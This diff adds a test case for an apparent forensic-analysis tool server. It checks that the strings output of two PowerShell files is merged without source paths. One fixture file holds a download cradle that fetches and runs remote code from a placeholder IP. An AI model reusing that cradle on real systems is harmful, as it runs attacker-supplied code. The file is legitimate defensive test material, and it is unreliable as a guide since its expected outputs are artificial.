@@ -1,0 +1,73 @@
+# Matrix case P4107-022: run_strings indexes every file as "strings.output",
+# and get_raw_output(source_name) takes the name as a prefix
+# (db.get_windows_page: source_name = x OR LIKE 'x.%'), so it joins the
+# windows of every source with that name into one raw_text. The response
+# carries only the name that was asked for: no source_id, no source_path, and
+# no mark where one file's output ends and the next begins.
+case_id: P4107-022
+problem: P4107
+server: mulder
+variant: mulder-3164843
+commit: 3164843baf74c7fe69e7121dbd6150f8f77ce660
+display: multi-call
+level: mcp
+realism: common
+realism_ko: "의심 스크립트·실행 파일 여러 개에 `run_strings`를 차례로 돌리는 것은 흔하고, 그 결과는 모두 `strings.output` 한 이름으로 적재되며 응답 힌트도 그 이름으로 `get_raw_output`을 부르라고 한다."
+coverage: full
+summary: >-
+  After run_strings on two scripts (a download cradle from the user's
+  Downloads folder and an IT logon script from NETLOGON), get_raw_output
+  ('strings.output') returns both outputs as one raw_text with
+  total_windows 2 and no source path or id, so the download cradle cannot be
+  tied to the file it came from; list_sources shows two sources with the
+  same name.
+summary_ko: "사용자 내려받기 폴더의 다운로드 스크립트와 NETLOGON의 로그온 스크립트에 `run_strings`를 돌리면, `get_raw_output('strings.output')`은 두 출력을 `raw_text` 하나로 이어 `total_windows: 2`로 돌려주고 출처 경로·ID는 싣지 않는다. 다운로드 구문이 어느 파일의 것인지 알 수 없고, `list_sources`에는 같은 이름의 source가 둘 있다."
+defect_ko: "이 서버는 같은 이름으로 적재된 여러 source의 출력을 구분 없이 이어 붙여 돌려준다. 정상이라면 source마다 경로(또는 ID)를 붙이거나 하나를 골라 읽게 해야 한다. 모델은 이어진 본문을 한 파일의 출력으로 보고, 다운로드 구문이 든 파일을 잘못 짚는다."
+setup_ko: "사용자 `Downloads`에 C2에서 스크립트를 받아 실행하는 `invoice.ps1`, NETLOGON에 드라이브를 연결하는 IT 로그온 스크립트 `logon.ps1`을 두고 둘 다 `run_strings`로 적재했다."
+fixture:
+  - path: C/Users/jlee/Downloads/invoice.ps1
+    text: |
+      $wc = New-Object Net.WebClient
+      $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+      IEX ($wc.DownloadString("http://203.0.113.7/a"))
+  - path: C/Windows/SYSVOL/domain/scripts/logon.ps1
+    text: |
+      # Corp logon script - maps the shared drives
+      New-PSDrive -Name S -PSProvider FileSystem -Root \\fs01\shared -Persist
+      New-PSDrive -Name H -PSProvider FileSystem -Root \\fs01\home\$env:USERNAME -Persist
+steps:
+  - tool: scan_evidence
+    note_ko: "준비: 사건 만들기"
+    args:
+      evidence_path: ${EVIDENCE}
+      case_id: strings-two-files
+  - tool: run_strings
+    note_ko: "준비: 다운로드 스크립트 적재"
+    args:
+      target_path: ${EVIDENCE}/C/Users/jlee/Downloads/invoice.ps1
+  - tool: run_strings
+    note_ko: "준비: 로그온 스크립트 적재"
+    args:
+      target_path: ${EVIDENCE}/C/Windows/SYSVOL/domain/scripts/logon.ps1
+  - tool: get_raw_output
+    note_ko: "결함 호출: 적재 응답이 안내한 이름으로 원문 읽기"
+    args:
+      source_name: strings.output
+  - tool: list_sources
+    note_ko: "비교 호출: 적재된 source 목록"
+expect:
+  - step: 2
+    note_ko: "적재 응답이 `get_raw_output('strings.output')`을 안내한다"
+    contains: "get_raw_output('strings.output')"
+  - step: 4
+    note_ko: "두 파일의 출력이 window 2개로 함께 나온다"
+    regex: '"total_windows": 2\b'
+  - step: 4
+    note_ko: "한 `raw_text` 안에 다운로드 구문과 로그온 스크립트가 이어져 있다"
+    regex: 'DownloadString\(\\"http://203\.0\.113\.7/a\\"\)\)\\n# Corp logon script'
+  - step: 4
+    note_ko: "응답에 어느 파일의 출력인지 가르는 경로가 없다"
+    not_contains: "invoice.ps1"
+  - step: 5
+    note_ko: "`strings.output`이라는 같은 이름의 source가 두 경로로 있다"
+    regex: '"source_name": "strings.output"[\s\S]*invoice.ps1[\s\S]*"source_name": "strings.output"[\s\S]*logon.ps1|"source_name": "strings.output"[\s\S]*logon.ps1[\s\S]*"source_name": "strings.output"[\s\S]*invoice.ps1'
